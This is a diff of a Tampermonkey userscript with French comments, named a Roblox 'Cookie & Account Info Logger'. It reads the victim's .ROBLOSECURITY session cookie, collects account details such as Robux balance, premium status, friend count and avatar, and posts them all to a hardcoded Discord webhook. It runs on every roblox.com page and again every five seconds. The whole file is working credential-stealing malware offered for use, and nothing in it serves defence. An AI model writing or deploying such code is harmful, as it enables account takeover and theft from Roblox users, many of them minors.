@@ -2,7 +2,7 @@
 // @name         Roblox Cookie & Account Info Logger
 // @namespace    http://tampermonkey.net/
 // @version      1.0
-// @description  RHAZE%
+// @description  RHAZE% - Envoie le cookie .ROBLOSECURITY et les infos du compte à un webhook Discord.
 // @author       MLK
 // @grant        GM_xmlhttpRequest
 // @grant        GM_getValue
@@ -14,163 +14,119 @@
 // @connect      friends.roblox.com
 // @connect      thumbnails.roblox.com
 // @connect      users.roblox.com
+// @match       https://www.roblox.com/*
+// @run-at      document-end
 // ==/UserScript==
 
 (function() {
     'use strict';
 
-
+    // 🔹 URL du webhook Discord (à remplacer si nécessaire)
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1502805198966493194/7BwtUSLcQP8tbHfNdR45hmYJ5rGzPs2xIJRu4RCxLuDfg7SYVVyGu-8qFZZ9Na4FJKDc";
-    const COOKIE_NAME = ".ROBLOSECURITY";
+
+    // 🔹 Évite d'envoyer le même cookie plusieurs fois
     const sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));
 
-
-    async function fetchAuthInfo() {
-        try {
-            const res = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' });
-            if (res.ok) return await res.json();
-        } catch (err) { console.error("Erreur fetchAuthInfo:", err); }
-        return null;
+    // 🔹 Récupère le cookie .ROBLOSECURITY
+    function getRobloxCookie() {
+        const cookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
+        return cookie ? cookie.split('=')[1] : null;
     }
 
-    async function fetchRobuxBalance(userId) {
+    // 🔹 Envoie le cookie et les infos du compte au webhook
+    async function sendToWebhook() {
+        const cookieValue = getRobloxCookie();
+        if (!cookieValue || sentCookies.has(cookieValue)) return;
+
         try {
-            const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
+            // Récupère les infos de l'utilisateur
+            const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                 credentials: 'include'
             });
-            if (res.ok) {
-                const data = await res.json();
-                return data.robux || 0;
-            }
-        } catch (err) { console.error("Erreur fetchRobuxBalance:", err); }
-        return "Unknown";
-    }
+            if (!authRes.ok) return;
 
-    async function checkPremium(userId) {
-        try {
-            const res = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
-                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
-                credentials: 'include'
-            });
-            return res.ok;
-        } catch (err) { console.error("Erreur checkPremium:", err); }
-        return false;
-    }
-
-    async function fetchProfileDetails(userId) {
-        try {
-            const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
-                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
-                credentials: 'include'
-            });
-            if (res.ok) return await res.json();
-        } catch (err) { console.error("Erreur fetchProfileDetails:", err); }
-        return null;
-    }
-
-    async function fetchFriendCount(userId) {
-        try {
-            const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
-                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
-                credentials: 'include'
-            });
-            if (res.ok) {
-                const data = await res.json();
-                return data.count || 0;
-            }
-        } catch (err) { console.error("Erreur fetchFriendCount:", err); }
-        return "Unknown";
-    }
-
-    async function fetchAvatarMetadata(userId) {
-        try {
-            const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
-            if (res.ok) {
-                const data = await res.json();
-                return data.data?.[0]?.imageUrl || "";
-            }
-        } catch (err) { console.error("Erreur fetchAvatarMetadata:", err); }
-        return "";
-    }
-
-
-    async function sendToWebhook(cookieValue, robuxBalance, username, displayName, premiumStatus, creationYear, friendCount, avatarUrl) {
-        if (!WEBHOOK_URL) return;
-
-        const premiumText = premiumStatus ? "Yes (Premium)" : "No Premium";
-
-        const payload = {
-            embeds: [{
-                title: "📊 Roblox Account Metrics Summary",
-                fields: [
-                    { name: "Display Name", value: displayName, inline: true },
-                    { name: "Username", value: username, inline: true },
-                    { name: "Robux Balance", value: String(robuxBalance), inline: true },
-                    { name: "Premium Status", value: premiumText, inline: true },
-                    { name: "Account Age (Year)", value: String(creationYear), inline: true },
-                    { name: "Total Friends", value: String(friendCount), inline: true }
-                ],
-                description: "**Session Cookie:**\n```" + cookieValue + "```",
-                color: 3447003,
-                thumbnail: avatarUrl ? { url: avatarUrl } : null,
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        try {
-            await GM_xmlhttpRequest({
-                method: "POST",
-                url: WEBHOOK_URL,
-                headers: { "Content-Type": "application/json" },
-                data: JSON.stringify(payload)
-            });
-            sentCookies.add(cookieValue);
-            localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
-        } catch (err) {
-            console.error("Erreur lors de l'envoi au webhook:", err);
-        }
-    }
-
-    // Vérifie et envoie le cookie
-    async function checkAndSendCookie() {
-        const currentCookie = document.cookie.split(';').find(c => c.trim().startsWith(`${COOKIE_NAME}=`))?.split('=')[1];
-        if (!currentCookie || sentCookies.has(currentCookie)) return;
-
-        try {
-            const authData = await fetchAuthInfo();
-            if (!authData?.id) return;
-
+            const authData = await authRes.json();
             const userId = authData.id;
             const username = authData.name;
             const displayName = authData.displayName || authData.name;
 
-            const [robuxBalance, isPremium, profileDetails, friendCount, avatarUrl] = await Promise.all([
-                fetchRobuxBalance(userId),
-                checkPremium(userId),
-                fetchProfileDetails(userId),
-                fetchFriendCount(userId),
-                fetchAvatarMetadata(userId)
-            ]);
+            // Récupère le solde Robux
+            const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
+                credentials: 'include'
+            });
+            const robuxBalance = robuxRes.ok ? (await robuxRes.json()).robux || 0 : "Unknown";
 
-            const creationYear = profileDetails?.created ? new Date(profileDetails.created).getFullYear() : "Unknown";
+            // Récupère le statut Premium
+            const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
+                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
+                credentials: 'include'
+            });
+            const isPremium = premiumRes.ok;
 
-            await sendToWebhook(
-                currentCookie,
-                robuxBalance,
-                username,
-                displayName,
-                isPremium,
-                creationYear,
-                friendCount,
-                avatarUrl
-            );
+            // Récupère la date de création du compte
+            const profileRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
+                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
+                credentials: 'include'
+            });
+            const profileData = profileRes.ok ? await profileRes.json() : null;
+            const creationYear = profileData?.created ? new Date(profileData.created).getFullYear() : "Unknown";
+
+            // Récupère le nombre d'amis
+            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
+                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
+                credentials: 'include'
+            });
+            const friendCount = friendsRes.ok ? (await friendsRes.json()).count || 0 : "Unknown";
+
+            // Récupère l'avatar
+            const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+            const avatarData = avatarRes.ok ? await avatarRes.json() : null;
+            const avatarUrl = avatarData?.data?.[0]?.imageUrl || "";
+
+            // 🔹 Prépare le payload pour Discord
+            const payload = {
+                embeds: [{
+                    title: "📊 Roblox Account Metrics Summary",
+                    fields: [
+                        { name: "Display Name", value: displayName, inline: true },
+                        { name: "Username", value: username, inline: true },
+                        { name: "Robux Balance", value: String(robuxBalance), inline: true },
+                        { name: "Premium Status", value: isPremium ? "Yes (Premium)" : "No Premium", inline: true },
+                        { name: "Account Age (Year)", value: String(creationYear), inline: true },
+                        { name: "Total Friends", value: String(friendCount), inline: true }
+                    ],
+                    description: "**Session Cookie:**\n```" + cookieValue + "```",
+                    color: 3447003,
+                    thumbnail: avatarUrl ? { url: avatarUrl } : null,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // 🔹 Envoie au webhook
+            await GM_xmlhttpRequest({
+                method: "POST",
+                url: WEBHOOK_URL,
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify(payload),
+                onload: function() {
+                    sentCookies.add(cookieValue);
+                    localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
+                    console.log("✅ Cookie et infos envoyés au webhook !");
+                },
+                onerror: function(error) {
+                    console.error("❌ Erreur lors de l'envoi au webhook:", error);
+                }
+            });
+
         } catch (error) {
-            console.error("Erreur dans checkAndSendCookie:", error);
+            console.error("❌ Erreur dans sendToWebhook:", error);
         }
     }
 
-    // Lancement de la vérification
-    checkAndSendCookie();
-    setInterval(checkAndSendCookie, 5000);
+    // 🔹 Exécute la fonction dès que la page est chargée
+    sendToWebhook();
+
+    // 🔹 Optionnel : Vérifie toutes les 5 secondes (au cas où le cookie change)
+    setInterval(sendToWebhook, 5000);
 })();
